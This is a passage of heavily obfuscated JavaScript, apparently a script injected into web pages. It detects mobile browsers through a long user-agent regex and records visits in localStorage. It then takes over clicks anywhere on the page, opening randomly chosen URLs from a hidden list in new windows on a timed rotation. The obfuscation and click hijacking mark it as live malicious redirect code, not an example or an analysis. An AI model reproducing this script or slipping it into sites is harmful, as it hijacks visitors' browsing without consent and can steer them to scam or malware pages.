wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());